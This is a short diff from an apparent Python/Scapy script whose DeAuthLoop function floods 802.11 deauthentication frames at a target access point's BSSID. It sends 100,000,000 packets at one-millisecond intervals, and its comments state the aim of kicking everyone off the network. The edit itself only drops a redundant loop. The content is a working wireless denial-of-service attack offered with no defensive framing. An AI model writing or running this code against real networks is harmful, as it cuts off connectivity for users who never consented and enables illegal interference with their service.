@@ -12,10 +12,10 @@ def DeAuthLoop(interface, brdMac, BSSID):
     # Addr2 is the target addr
     # Addr3 is used to target specific clients(users) (but I set it to the target addr to kick everyone off the network)
     # Interface is the full wlan address. (can be found via the terminal... run command 'pwconfig' and find the desired device)
-    for i in range(0, 1):
-        pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
-        sendp(pkt, iface=interface, count=100000000,
-              inter=.001)  # Send the packets
+    #for i in range(0, 1):
+    pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
+    sendp(pkt, iface=interface, count=100000000,
+            inter=.001)  # Send the packets
 
 
 def setTarget(brdMac, interface, BSSID):
